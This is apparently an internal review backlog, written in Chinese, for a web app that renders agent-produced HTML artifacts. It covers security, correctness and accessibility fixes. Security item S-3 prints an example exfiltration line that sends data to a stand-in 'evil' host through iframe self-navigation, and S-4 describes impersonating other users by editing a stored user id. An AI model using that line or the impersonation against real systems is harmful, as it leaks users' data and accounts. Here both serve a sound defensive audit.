# 待修事項總表(2026-08-30,2026-08-31 更新)

七軸審查(Standards / Spec / Runtime / Load / Maintainability / Security / Correctness /
A11y)後,**尚未修復**的全部項目,逐項驗證過在 `perf/deep-review` 的當前 HEAD 仍然
存在。每項標注驗證等級(VERIFIED = 追過程式碼或實測 / INFERRED = 依規範推論)與是否
需要決策(前端無法單方面決定的用 ⚖ 標記)。

已修復的不列在這裡(見 `deep-review-2026-08-28-fixes.md` 與各 commit)。

## 2026-09-03 更新

- **無障礙 A-1〜A-6 已全部修復**(commit `72facf3`),各附行為測試;下方段落保留為
  紀錄,標題加註。A-7(次要集)與「jsx-a11y 零規則」仍未處理。
- S-3 / S-4 仍待決策,現在是這份文件唯一的未結項(加上 A-7 與正確性次要)。

## 2026-08-31 更新

- **正確性 C-2〜C-5 與 G-1 已全部修復**(批次 A,commit `ba1254a`),下方段落保留為
  紀錄,標題加註「已修復」。
- **G-1 之後又自然消失**:分享的收件者改為搜尋式查詢(`GET /hr/employeesAndOrgs`),
  底下已經不是 suspense query,portal 無邊界的問題不復存在。
- **新增一項 A-8**(見無障礙段落):`ArtifactCard` 的 unpublish 確認框。
- 安全性 S-3 / S-4 與無障礙 A-1〜A-7 **仍未處理**,是這份文件現在唯一的內容。

---

## 安全性

### S-3 ⚖ artifact 可經 iframe 自身導覽外送資料 — VERIFIED

`sandbox="allow-scripts"` 只缺 `allow-top-navigation`,擋的是**頂層**導覽,不擋 iframe
導覽自己;CSP 也沒有能擋這件事的指令(`navigate-to` 已從規範移除)。所以
`location.href = 'https://evil/?' + data` 可把烤進文件的 fab 資料送出。
`connect-src 'none'` 只擋 fetch/XHR/WebSocket。

**前端無法完全封死。** 三條路,需決策:

1. **接受並記進 ADR** — 內部工具、artifact 由自家 agent 產出,風險視為可接受。最省事。
2. **後端組裝時消毒** agent 產出的 HTML(移除/改寫導覽性 script)。最徹底,但跨團隊。
3. 前端加導覽偵測(`beforeunload` 之類)做緩解 — 不可靠,不建議當唯一防線。

`docs/api/backend-questions-artifact.md` 已記錄此項與其對「分享=快照」安全邊界的影響。

### S-4 ⚖ `X-User-Id` 可任意冒用,且未記為接受風險 — VERIFIED

改 localStorage 的 `erd_user_id` 即冒用他人全部 session/artifact。UUID v4 不可猜,但
**internal 環境若改用 NT account 當 id 就變成可枚舉**。`interface.md` 與 ADR-0007 只
描述機制,沒有任何一處記為「已知並接受的風險」,也沒寫 gateway MUST 剝除用戶端送來的
`X-User-Id`。

**修法**:補一則 ADR 明記這是 v1/pre-SSO 的接受風險,並要求 gateway 在 internal
環境覆寫(而非信任)該 header。這是文件 + 部署契約,不是前端程式碼。

---

## 正確性(全部 VERIFIED,多數已用 probe 重現)

### C-2 跑完才按 Stop → 答案顯示兩次 — ✅ 已修復(2026-08-30)

`useAgentStream.ts:253` 的 `await invalidateSessionData()` 在 `DONE` 之前,這段網路來回
期間 `isStreaming` 仍為 true、按鈕還是 Stop。此時按下去只 dispatch `STOPPED`,而
`stopped` 只有 `START`/`RESET` 會清 → 產生「⏹ 已停止生成」幽靈泡泡,與 refetch 回來的
正式訊息內容重複,直到下次送出才消失。`stop()` 對完全 idle 的 hook 也會把 `stopped`
設 true。
**修法**:`stop()` 加守衛 `if (!isStreaming) return;`,或 `STOPPED` case 改為
`state.isStreaming ? {...state, stopped: true} : state`。無測試覆蓋。

### C-3 連續送出相同文字,第二顆使用者泡泡不出現 — ✅ 已修復(2026-08-30)

`ThreadPanel.tsx:176` 用 `pendingQuestion !== lastHistoryQuestion`(文字比對)抑制樂觀
泡泡。歷史結尾是 USER 訊息時(reask 或 stop 後)再送同一句 → 整段串流期間畫面只有一顆
該文字的泡泡,使用者以為沒送出。
**修法**:改用送出序號/時間戳而非文字比對(例如記 `pendingSentAt`,在 `messages.length`
變化時清除)。無測試覆蓋。

### C-4 repair 的 `setStatus` 會蓋到別的 artifact — ✅ 已修復(2026-08-30)

`useRepairOfferStore.ts:50` 的 `setStatus` 不檢查 artifactId。修 A 的 request 在飛時切
session、C 拋錯建立新 offer → A 的結果(`repaired:false`→`setStatus('failed')`)打在 C
上;若 `repaired:true` 則 `clear()` 吃掉 C 的 offer 並 `bumpArtifactReload()` 重載 C。
**修法**:`setStatus(artifactId, status)`,artifactId 不符即忽略。

### C-5 第二個壞掉的 artifact 永遠不會被提修復 — ✅ 已修復(2026-08-30)

`useRepairOfferStore.ts:44`:`offer !== null` 時 `report` 直接 return,錯誤被丟棄且不
重播。切版本時 A、B 都拋錯 → 只留 A 的 offer;使用者忽略 A 後,壞掉的 B 沒有任何修復
入口。
**修法**:report 排隊,或 `clear`/`dismiss` 時允許重新收集。

### 正確性 — 次要

- **`useArtifactContent` 的 `keepPreviousData` × iframe key**(INFERRED):切版本時新 key
  會配上舊版本的 HTML 先掛載一次,該文件的 runtime error 會被記到新 artifactId 名下。
  零延遲 mock 下測不出來。
- `useArtifactRepair` 的 `invalidateQueries(artifactContentQueryKey)` 之後才 bump nonce
  → 該次 invalidate 實質無作用(無害,但誤導,可刪)。
- `useAgentStream.reset()` 全 app 無人呼叫;`controllerRef` 跑完後未清空(無害)。

---

## 無障礙(全部 VERIFIED;`jsx-a11y` 目前註冊但零規則)

### A-1 串流訊息整段重複朗讀 — 最嚴重 — ✅ 已修復(2026-09-03)

`MessageList.tsx:146` 整個 thread 是 `role="log"`(隱含 `aria-live="polite"`),串流泡泡
就在裡面。每個 token 進來重寫段落 → 螢幕閱讀器每個 token 重念愈來愈長的回覆;切 session
會把整串歷史當 additions 唸完。**螢幕閱讀器使用者完全無法用聊天。**
**修法**:thread 顯式 `aria-live="off"`,另設一個 sr-only `aria-live="polite"` 區塊,只在
stream 結束時放入完整回覆。**lint 抓不到**(語意正確、行為錯誤)。

### A-2 版本選單是假 menu — ✅ 已修復(2026-09-03)

`VersionSwitcher.tsx:66,76` 有 `role="menu"/"menuitem"` 但無方向鍵、無 roving tabindex;
Escape 後焦點掉回 `<body>`,三欄版面裡等於位置全失;`:67` 標題 div 是 menu 的非法子元素。
**修法**:改用 antd `Dropdown`(專案別處已用),或補方向鍵 + 關閉時還焦。

### A-3 步驟清單累積重播 — ✅ 已修復(2026-09-03)

`MessageBubble.tsx:274` `role="status"` 隱含 `aria-atomic="true"`,每加一步重念全部。
**修法**:改 `aria-live="polite" aria-atomic="false"`,或只讓最新一列進 live region。
**lint 抓不到。**

### A-4 分隔條純滑鼠 — ✅ 已修復(2026-09-03)

`ResizeHandle.tsx:25` 有 `role="separator"` 但無 `tabIndex`/`onKeyDown`/
`aria-valuenow`,只有 pointer。鍵盤使用者無法調整任一欄寬。
**修法**:`tabIndex={0}` + 左右鍵呼叫 `onDrag(±16)` + `aria-valuenow/min/max`。
**lint 抓不到。**

### A-5 Tooltip 不會被朗讀 — ✅ 已修復(2026-09-03)

`Tooltip.tsx:29,62` 產了 `tipId` 卻從未以 `aria-describedby` 接到 trigger。焦點可觸發
但內容無關聯;包在非可聚焦 `<span>` 時完全讀不到。**lint 抓不到。**

### A-6 收合 rail 的 flyout 是假 dialog — ✅ 已修復(2026-09-03)

`CollapsedSessionRail.tsx:112` `role="dialog"` 但無焦點移入/trap/Escape;`:109` backdrop
是 `div onClick`(鍵盤無法關)。**啟用 jsx-a11y 會抓到這一條**
（`no-static-element-interactions` / `click-events-have-key-events`）。

### A-8 unpublish 確認框(2026-08-31 新增)— ✅ 已實作(2026-09-03)

原文描述的 `Modal.confirm` 當時**並未實作**,這條記錄讀起來像已完成待檢查——
2026-09-03 起才真的存在:`useConfirmDestructive` 統一 danger 確認,
`autoFocusButton: 'cancel'`(焦點落在安全側),Session 刪除與 Artifact 下架共用。

### A-7 次要

iframe title 未帶 artifact 名稱;中英混雜的 aria-label(`VersionSwitcher` 用中文「切換
版本」vs `ArtifactPanel` 用英文「Share artifact」);全站零 `<a href>`、hash 路由切換
不移焦點、無 skip link。

---

## 縫隙掃描(2026-08-30 新增)

### G-1 ShareArtifactDialog 的 suspense query 無邊界 — ✅ 已解決(2026-08-31)

先以內層 `DataBoundary` 修復,隨後收件者改為搜尋式的一般查詢,底下不再有 suspense
query,問題整個消失。以下為原始紀錄。

`ShareArtifactDialog.tsx:18` 用 suspense query `useDirectory`,而它是 antd Modal(portal
到 `document.body`,在所有 `DataBoundary` 之外)。目前 `useDirectory` 是同步 resolve 的
stub,不會 suspend 也不會 fail,所以無感;但**真的 `GET /directory` 上線後**,開啟對話框
時的 suspend/error 會找不到邊界 → 可能整頁白屏或未捕捉錯誤。
**修法**:對話框內容包一層自己的 `DataBoundary`/`Suspense`。與後端問題清單第 4 題相關。

### 掃描過、確認無問題的

- 無 `TODO`/`FIXME`/`HACK`/`@ts-ignore`/`eslint-disable`
- 無 `: any` / `as any` 逃逸(strict 已開)
- 所有 `addEventListener`/`setTimeout`/`setInterval` 的 cleanup 全部配對,無洩漏
- `utils/` 純函式(tableMarkers/liftQuestions/deriveArtifactVersions)無 off-by-one
- `npm audit` 0 漏洞、無 `dangerouslySetInnerHTML`/`eval`、markdown 未開 `rehype-raw`

---

## 建議批次

| 批次                | 內容                                 | 性質                                   |
| ------------------- | ------------------------------------ | -------------------------------------- |
| **A(前端可獨立做)** | C-2、C-3、C-4、C-5、G-1 + 正確性次要 | 邏輯 bug,各附回歸測試                  |
| **B(a11y)**         | A-1~A-6                              | 若有無障礙要求則 A-1 優先度等同 P0     |
| **C(需決策)⚖**      | S-3、S-4                             | 前端無法單方面決定,產出 ADR / 後端契約 |

後端問題(`Artifact.pinnedAt` 歸屬、排程歸屬、`Artifact.type`、`GET /directory`、分享
層級、lineage)另見 `docs/api/backend-questions-artifact.md`,不在前端待辦內。
